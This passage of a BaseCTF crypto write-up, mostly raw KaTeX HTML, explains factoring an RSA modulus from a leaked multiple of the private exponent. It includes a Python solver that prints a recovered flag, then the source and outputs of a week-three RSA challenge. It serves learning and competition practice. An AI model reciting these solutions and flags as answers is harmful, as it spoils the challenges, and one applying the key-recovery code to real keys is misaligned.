class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">凡</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">根</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">遍</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">于</span><span class="mord">1</span><span class="mord cjk_fallback">了</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">得</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">得</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">数</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">得</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">指</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">数</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">了</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">中</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord cjk_fallback">改</span><span class="mord cjk_fallback">成</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">）</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_factors</span>(<span class="hljs-params">N, gift</span>):<br>    ans=[]<br>    factors=[N]<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(factors)&gt;<span class="hljs-number">0</span>:<br>        N=factors[<span class="hljs-number">0</span>]<br>        w = randrange(<span class="hljs-number">2</span>, N - <span class="hljs-number">1</span>)<br><br>        s = <span class="hljs-number">0</span><br>        a_1 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s), N)<br>        <span class="hljs-keyword">while</span> a_1!=<span class="hljs-number">1</span>:<br>            s=s+<span class="hljs-number">1</span><br>            a_1 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s), N)<br>        <br>        <span class="hljs-keyword">if</span> s!=<span class="hljs-number">0</span>:<br>            a_2 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s-<span class="hljs-number">1</span>), N)<br>            <span class="hljs-keyword">if</span> a_2!=N-<span class="hljs-number">1</span>:<br>                p = gcd(N, a_2 + <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">if</span> p!=<span class="hljs-number">1</span>:<br>                    q=N//p<br>                    factors=factors[<span class="hljs-number">1</span>:]<br>                    <span class="hljs-keyword">if</span> isPrime(p):<br>                        ans.append(p)<br>                    <span class="hljs-keyword">else</span>:<br>                        factors.append(p)<br>                    <span class="hljs-keyword">if</span> isPrime(q):<br>                        ans.append(q)<br>                    <span class="hljs-keyword">else</span>:<br>                        factors.append(q)<br>    <span class="hljs-keyword">return</span> ans<br>N = <span class="hljs-number">162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259</span><br>c = <span class="hljs-number">113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095</span><br>gift = <span class="hljs-number">863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875</span><br><br><br>primes=my_factors(N,gift)<br><span class="hljs-built_in">print</span>(primes)<br>permutation=itertools.combinations(primes,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permutation:<br>    p,q=i<br>    p,q=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q)<br>    flag=long_to_bytes(<span class="hljs-built_in">pow</span>(c,inverse(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;ed4bff90-d1f4-4f0f-a3bd-999c54d9eeb7&#125;;\xef\xd7&quot;X\xceglz\xc2l\xc3\xf0\x04\n$I\x00\xda\rT\xc5\xef\xc9t]\x0c\xae@\xdcO5\x02\xa8\xd6/&#123;5\xacD5\xda\x11&#123;\x80\x80\xa3\t#\x97\x871L\x10\r\x122z\xe1\x89%\x85\xdb\x94&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h2><h3 id="没有n啊"><a class="markdownIt-Anchor" href="#没有n啊"></a> 没有n啊</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=getPrime(<span class="hljs-number">512</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>x=<span class="hljs-built_in">pow</span>(n,e,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>,d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x =&quot;</span>,x)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">d = 54297831548863701092644190086258072883163378307246681513317422545902442650340916001357605211715836911877651782099787873046987096258918495734824011752504203578982947618784736181975847356304742402103468329660346526185908618978851982007496096394151821403282347897417590596861323293706611997134962231129075032641</span><br><span class="hljs-string">x = 40635864473997460751766935373772107585133301579524000836637683731949939348171187931595274511243052505604832873086269554842194695737052043633079044688826020656068356561856848814530947955429343483847291398607359454851926470168457852479044154798114087493843073091985855839008222762224952503563764527380033064437</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><mi>c</mi><mo>+</mo><mi>a</mi><mspace linebreak="newline"></mspace><mi>x</mi><mo>=</mo><msup><mi>n</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>二项式定理：</mtext><mi>x</mi><mo>=</mo><msup><mi>a</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>c</mi></msub><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>x</mi><msub><mi>d</mi><mi>c</mi></msub></msup><mo>=</mo><msup><mi>a</mi><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>c</mi></msub></mrow></msup><mo>=</mo><mi>a</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n=c+a\\x=n^e\quad mod(c)\\二项式定理：x=a^e\quad mod(c)\\e*d_c=1\quad mod(\phi(c))\\x^{d_c}=a^{e*d_c}=a\quad mod(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">x</span><span class="mspace" 